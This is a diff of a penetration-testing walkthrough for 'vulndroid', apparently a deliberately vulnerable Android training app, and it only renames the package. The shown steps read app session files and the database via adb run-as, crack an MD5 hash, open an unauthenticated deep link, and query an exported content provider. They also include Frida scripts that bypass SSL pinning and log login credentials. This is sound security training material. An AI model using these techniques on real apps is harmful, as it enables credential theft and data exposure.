@@ -15,7 +15,7 @@ emulator -avd Pixel_3_API_29 -writable-system
 adb install vulndroid.apk
 
 # 3. Verify debug build (debuggable=true means run-as works)
-adb shell dumpsys package com.vulndroid | grep debuggable
+adb shell dumpsys package com.weijia.vulndroid | grep debuggable
 
 # 4. Install Frida server on emulator
 adb push frida-server /data/local/tmp/
@@ -89,7 +89,7 @@ Expected: All user records returned including admin account
 
 ```bash
 # Works on debug build without root
-adb shell run-as com.vulndroid cat /data/data/com.vulndroid/shared_prefs/user_session.xml
+adb shell run-as com.weijia.vulndroid cat /data/data/com.weijia.vulndroid/shared_prefs/user_session.xml
 
 # Expected output:
 # <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
@@ -106,7 +106,7 @@ adb shell run-as com.vulndroid cat /data/data/com.vulndroid/shared_prefs/user_se
 
 ```bash
 # Copy database from device
-adb shell run-as com.vulndroid cp /data/data/com.vulndroid/databases/vulndroid.db /sdcard/
+adb shell run-as com.weijia.vulndroid cp /data/data/com.weijia.vulndroid/databases/vulndroid.db /sdcard/
 adb pull /sdcard/vulndroid.db
 
 # Open with sqlite3
@@ -136,7 +136,7 @@ hashcat -m 0 482c811da5d5b4bc6d497ffa98491e38 /usr/share/wordlists/rockyou.txt
 
 ```bash
 # Bypass login and go directly to password reset
-adb shell am start -n com.vulndroid/.ui.VulnerableDeepLinkActivity
+adb shell am start -n com.weijia.vulndroid/.ui.VulnerableDeepLinkActivity
 
 # Expected: Password reset screen opens — no authentication required
 ```
@@ -147,7 +147,7 @@ adb shell am start -n com.vulndroid/.ui.VulnerableDeepLinkActivity
 
 ```bash
 # Read all user data without any permission
-adb shell content query --uri content://com.vulndroid.provider/users
+adb shell content query --uri content://com.weijia.vulndroid.provider/users
 
 # Expected: All user rows returned including email, phone, DOB, MD5 hash
 ```
@@ -176,7 +176,7 @@ adb logcat | grep -i "vulndroid"
 // frida_ssl_bypass.js
 Java.perform(function() {
     var TrustManager = Java.registerClass({
-        name: 'com.vulndroid.bypass.TrustManager',
+        name: 'com.weijia.vulndroid.bypass.TrustManager',
         implements: [Java.use('javax.net.ssl.X509TrustManager')],
         methods: {
             checkClientTrusted: function(chain, authType) {},
@@ -190,7 +190,7 @@ Java.perform(function() {
 ```
 
 ```bash
-frida -U -n com.vulndroid -l frida_ssl_bypass.js
+frida -U -n com.weijia.vulndroid -l frida_ssl_bypass.js
 ```
 
 ### Hook Login Function
@@ -198,7 +198,7 @@ frida -U -n com.vulndroid -l frida_ssl_bypass.js
 ```javascript
 // frida_hook_login.js
 Java.perform(function() {
-    var LoginActivity = Java.use('com.vulndroid.ui.login.LoginActivity');
+    var LoginActivity = Java.use('com.weijia.vulndroid.ui.login.LoginActivity');
     LoginActivity.attemptLogin.implementation = function(username, password) {
         console.log('[*] Login attempt:');
         console.log('    Username: ' + username);
@@ -209,7 +209,7 @@ Java.perform(function() {
 ```
 
 ```bash
-frida -U -n com.vulndroid -l frida_hook_login.js
+frida -U -n com.weijia.vulndroid -l frida_hook_login.js
 ```
 
 ---
